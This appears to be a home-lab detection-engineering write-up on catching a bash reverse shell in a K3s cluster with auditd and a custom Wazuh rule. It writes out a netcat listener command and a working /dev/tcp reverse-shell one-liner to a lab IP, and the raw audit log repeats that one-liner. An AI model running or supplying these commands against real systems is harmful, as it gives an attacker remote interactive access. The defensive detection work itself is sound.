## What This Technique Is

A reverse shell is a connection initiated by the victim machine back to the attacker. The attacker listens on a port, the victim runs a command that connects back and hands over a shell. This is a common post-exploitation technique used to establish persistent interactive access after initial compromise.

The default bash one-liner uses `/dev/tcp`, a bash built-in that opens a TCP socket without requiring any external tools on the victim.

---

## Detection Engineering Context

Default Wazuh rules did not detect this technique. The standard log sources (auth.log, syslog) do not capture arbitrary command execution. This simulation required:

1. Deploying auditd across all nodes via Ansible to capture execve system calls at the kernel level
2. Writing a custom Wazuh rule to alert on interactive shell execution
3. Tuning the rule to filter out false positives generated by K3s cluster components

### The Noise Problem

After enabling auditd, over 4,000 alerts per hour were generated by K3s networking (Flannel) repeatedly calling iptables via `xtables-nft-multi`. These are headless automated processes with no TTY.

### The Fix

A custom rule (`100003`) was written to only fire when the executing process has an interactive TTY (`pts/X`). Automated processes run without a TTY, so they are excluded. A real attacker running an interactive shell will always have a TTY assigned.

The key filter in the custom rule:

    <field name="audit.tty" negate="yes">^\(none\)$</field>

This drops all events where TTY is `(none)` — headless processes — while retaining all interactive sessions.

## Attack

### Step 1 — Set Up Listener on Kali

On kali01, open a netcat listener to receive the incoming shell:

    nc -lvnp 4444

| Flag | Meaning |
|---|---|
| `-l` | Listen for incoming connections |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p 4444` | Listen on port 4444 |

### Step 2 — Execute Reverse Shell on Target

On node01 (simulating post-compromise execution):

    bash -c 'bash -i >& /dev/tcp/192.168.178.29/4444 0>&1'

This redirects bash's stdin, stdout, and stderr over a TCP connection to kali01 on port 4444. The attacker's netcat listener receives an interactive shell on node01.

## Detection

### auditd Rule Deployed on node01

The following auditd rule captures all execve calls (process execution) on both 32-bit and 64-bit architectures:

    -a always,exit -F arch=b64 -S execve -k audit-wazuh-execution
    -a always,exit -F arch=b32 -S execve -k audit-wazuh-execution

Every process execution on the system is tagged with `audit-wazuh-execution` and written to `/var/log/audit/audit.log`.

### Raw Log Generated on node01

    type=SYSCALL msg=audit(1781976115.102:8932): arch=c000003e syscall=59 success=yes exit=0 ppid=50788 pid=55892 auid=1000 uid=1000 gid=1000 euid=1000 tty=pts0 ses=187 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-execution"
    type=EXECVE msg=audit(1781976115.102:8932): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/192.168.178.29/4444 0>&1"

Key fields: `tty=pts0` confirms this is an interactive session. The full command including the attacker IP and port is visible in `a2`.

### Custom Wazuh Rule (100003)

    <rule id="100003" level="14">
      <if_group>audit</if_group>
      <field name="audit.key">audit-wazuh-execution</field>
      <field name="audit.tty" negate="yes">^\(none\)$</field>
      <description>Interactive process execution detected via auditd</description>
      <mitre>
        <id>T1059.004</id>
      </mitre>
    </rule>

## Why This Required Custom Configuration

Log-based detection only works if the relevant activity is logged. Standard Linux logging does not capture arbitrary command execution — only authentication events, service starts, and similar system events.

auditd hooks into the kernel and can log any system call, including execve (process creation). This is the only reliable way to detect arbitrary command execution on Linux without an EDR agent.

The TTY filter was essential. Without it, legitimate cluster automation generates thousands of alerts per hour, making the detection useless in practice.

| Control | Notes |
|---|---|
| Egress firewall rules | Block outbound connections from worker nodes to arbitrary IPs and ports |

| Network monitoring | Detect unexpected outbound connections at the network layer |
| Principle of least privilege | Limit which users can execute arbitrary commands on worker nodes |

---

## Detection Tuning Notes

Rule 100003 fires on all interactive process execution, not just reverse shells. This is intentional — the alert gives an analyst visibility into what commands are being run interactively on nodes where no human should normally be logged in.

In a production environment, further tuning options include:

- Allowlisting known admin usernames and expected commands
- Correlating with authentication logs to distinguish legitimate admin sessions from attacker sessions
- Adding network flow monitoring to detect the outbound TCP connection that accompanies the reverse shell
